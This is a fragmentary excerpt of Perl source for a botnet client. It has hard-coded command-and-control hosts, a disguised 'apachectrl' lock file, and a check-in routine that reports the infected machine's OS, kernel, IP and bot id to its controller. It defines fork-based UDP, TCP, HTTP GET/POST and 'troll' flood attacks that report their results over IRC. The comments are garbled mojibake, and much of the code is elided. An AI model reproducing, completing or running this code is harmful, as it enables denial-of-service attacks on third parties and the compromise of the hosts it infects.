...
if ($os eq "MSWin32"){
        my $temp = `echo %temp%`;
        chomp $temp;
        $lockfilename = $temp."\\apachectrl.lock";
        $serverfile = $temp."\\srv.list";
        $idfile = $temp."\\id";
        $uafile = $temp."\\ua";
}
else {
...
my @defaults = ("93.113.196.30:80", "microsoftnetnews.com:80", "thismovie.org:80");
my $proxyPort = 5432;
...
sub startNewTask {
        ...
        if ($missionType eq 'get'){
                ...
                print "udpflood\n";
                if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) {
                        #print "id = $1| type = $2| host = $3| packetsize = $4 | duration = $5| pingtime = $6\n";

                        $tasks{$taskToStart} = attackUdpFlood($3, $4, $5);
                        print "id = $1| type = $2| host = $3| packetsize = $4 | duration = $5| pingtime = $6, pid = $tasks{$taskToStart}\n";
                        setPingTime($6);
                } else {
        ...
        }elsif ($missionType eq 'tcp'){ # TCP ‡Ú‡ÍÅE ÚÓÊÂ ˜ÚÅEÅEÚ¸JÅE ˚M ÅEÅEÒ˚ÅE¸H ÅEÒÓ‡ ÅEÅEÚ ÅEÒÎÅEÅE˚LÂÍÚ‡.
                if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) {
...
sub connectToServer {
        ...
        $path .= "?version=$version&kernel=$linuxKernel&os=$os&ip=$localip&id=$botid&up=".$uptime;
        print "path = $path\n";
...
#ıÚÚÔ √≈“ ‡Ú‡ÍÅE(ÅE‡ÅEÚÅE: ıÓÒÚ, ÅEÚ, ÅEÚ¸ ‰Ó ÒÍËÅEÅE ‚ÂÏˇ ¸EË‰‡ÌÅE ÅEÊ‰ÅEÁ‡ÅE˙B‡ÏÅE
sub sendGetRequest {
        my $host = $_[0];
        my $port = $_[1];
        my $path = $_[2];
...
#ıÓÒÚ, ÅEÚ, ÅEÚ¸ ‰Ó ÒÍËÅEÅE ‚ÂÏˇ ¸EË‰‡ÌÅE ÅEÊ‰ÅEÁ‡ÅE˙B‡ÏÅE ÚÂÅEÚÓ‚˚ÅE·ÛÙÙÂ ‰Îˇ ˙CÒ˚ÅEÅEÅEÚÂÅE œŒ—“ÅE
sub sendPostRequest {
        my $host = $_[0];
        my $port = $_[1];
        my $path = $_[2];
...
# HTTP GET (ÅE‡ÅEÚÅE: ıÓÒÚ, ÅEÚ, ÅEÚ¸ ‰Ó ÒÍËÅEÅE ‚ÂÏˇ ¸EË‰‡ÌÅE ÅEÊ‰ÅEÁ‡ÅE˙B‡ÏÅE
sub attackHttpGet {
        $child = fork;
        if ($child == 0){
                my $host = $_[0];
...
# œŒ—“ ‡Ú‡ÍÅE(ÅE‡ÅEÚÅE: ıÓÒÚ, ÅEÚ, ÅEÚ¸ ‰Ó ÒÍËÅEÅE ‚ÂÏˇ ¸EË‰‡ÌÅE ÅEÊ‰ÅEÁ‡ÅE˙B‡ÏÅE ÚÂÅEÚÓ‚˚ÅE·ÛÙÙÂ ‰Îˇ ˙CÒ˚ÅEÅEÅEÚÂÅE œŒ—“ÅE
sub attackHttpPost {
        $child = fork;
        if ($child == 0){
                my $host = $_[0];
...
# TROLL ‡Ú‡ÍÅE(ÅE‡ÅEÚÅE: ıÓÒÚ, ÅEÚ, ÅEÅE‚Ó ÅE˚LÂÍÚÓÅE˙¸ 1 ÅEÚÓÅE ÒÎËÔ). ÂÒÅE ÅEÚ 0, ÚÓ ÅEÚ ‡˚C¸K.
sub attackTroll {
        $child = fork;
        if ($child == 0){
                my $host = $_[0];
...
# TCP ‡Ú‡ÍÅE ÚÓÊÂ ˜ÚÅEÅEÚ¸JÅE ˚M ÅEÅEÒ˚ÅE¸H ÅEÒÓ‡ ÅEÅEÚ ÅEÒÎÅEÅE˚LÂÍÚ‡. ‰ÓÅEÅE‡ÅEÚ : ÅEÅEËÏ‡ÎÅE˚È ‡ÁÏÂ ÅEÒÓÌ¸BÅEÂÅEÂÒÚ‡.
sub attackTcpTroll {
        $child = fork;
        if ($child == 0){
                my $host = $_[0];
...
# HTTP from IRC (ÅE‡ÅEÚÅE: ıÓÒÚ, ‰ÎËÚÂÎÅE˙BÚ¸)
sub attackHttpFlood {
        $child = fork;
        if ($child == 0){
                my $host = $_[0];
...
# UDP from IRC (ÅE‡ÅEÚÅE: ıÓÒÚ, ‡ÁÏÂ ÅEÅEÚ‡ ÅEKb, ‰ÎËÚÂÎÅE˙BÚ¸)
sub attackUdpFlood {
        $child = fork;
        if ($child == 0){
                my $host = $_[0];
                ...
                my ($dtime, %pacotes) = udpflooder("$host", "$packetSize", "$duration");
                $dtime = 1 if $dtime == 0;
                my %bytes;
                ...
                print "PRIVMSG $target :[UDP-DDos] Results ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in ".$dtime." seconds to ".$1.".";
                exit;
        }
        else {
                return $child;
...
# TCP from IRC (ÅE‡ÅEÚÅE: ıÓÒÚ, ÅEÚ, ‰ÎËÚÂÎÅE˙BÚ¸)
sub attackTcpFlood {
        $child = fork;
        if ($child == 0){
                my $host = $_[0];
